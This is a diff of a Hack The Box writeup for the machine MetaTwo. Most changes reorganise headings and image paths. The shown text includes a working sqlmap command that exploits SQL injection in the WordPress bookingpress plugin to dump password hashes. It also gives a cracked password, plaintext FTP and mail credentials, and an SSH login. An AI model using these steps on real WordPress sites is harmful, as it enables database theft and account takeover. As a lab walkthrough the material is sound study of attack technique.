@@ -1,18 +1,26 @@
 # MetaTwo
 
-<Image src="/images/writeups/htb/metatwo/banner.png" />
+A writeup for the machine [MetaTwo](https://app.hackthebox.com/machines/MetaTwo) on Hack The Box.
 
-### nmap scan
+<Image src={require("./banner.png").default} width="700" />
+
+## Footprinting
+
+### Nmap scan
 
 By scanning with nmap we can find three open ports. In particular, on port 80 there is a website available based on Wordpress at the address `metapress.htb`
 
-<Image src="/images/writeups/htb/metatwo/nmap.png" />
+<Image src={require("./nmap.png").default} />
 
-### Analyzing the website
+### Web server
 
 By looking to the source code of the index it is possible to see that the website uses Wordpress.
 
-<Image src="/images/writeups/htb/metatwo/source.png" />
+<Image src={require("./source.png").default} />
+
+## User flag
+
+### Exploiting Wordpress
 
 We can also notice that a plugin called bookingpress-appointment-booking is used. with version 1.0.10. It is enough to search on Google for vulnerabilities to find a SQLi.
 
@@ -44,7 +52,7 @@ Get password of admin and manager users
 sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch --sql-query "SELECT user_pass FROM wp_users WHERE ID=1"
 ```
 
-<Image src="/images/writeups/htb/metatwo/sqlmap.png" />
+<Image src={require("./sqlmap.png").default} />
 
 Final hashes
 
@@ -55,7 +63,7 @@ $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 manager
 
 Using hashcat and the rockyou list is possible to find the password for manager: `partylikearockstar`.
 
-<Image src="/images/writeups/htb/metatwo/manager.png" />
+<Image src={require("./manager.png").default} />
 
 Once inside we can try to exploit the permissions of the manager user.
 We can use tool like Wappalyzer to find the version of Wordpress used by the website (5.6.2).
@@ -100,16 +108,26 @@ define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
 ...
 ```
 
-<Image src="/images/writeups/htb/metatwo/ftp.png" />
+<Image src={require("./ftp.png").default} />
 
 In addition to the blog files, there is also a folder called `mailer` where we can find a file `send_email.php`.
 Inside the file we can find the credentials for the mail server:
 
 ```php title="send_email.php"
-...
 $mail->Username = "jnelson@metapress.htb";
 $mail->Password = "Cb4_JmWM8zUZWMu@Ys";
-...
 ```
 
-By logging in using ssh we can find the user flag.
+### Accessing with SSH
+
+We can use the credentials that we found to login via SSH.
+
+```bash
+ssh jnelson@TARGET_IP
+```
+
+Once inside the machine, we can find the user flag inside the home directory.
+
+```bash
+cat user.txt
+```
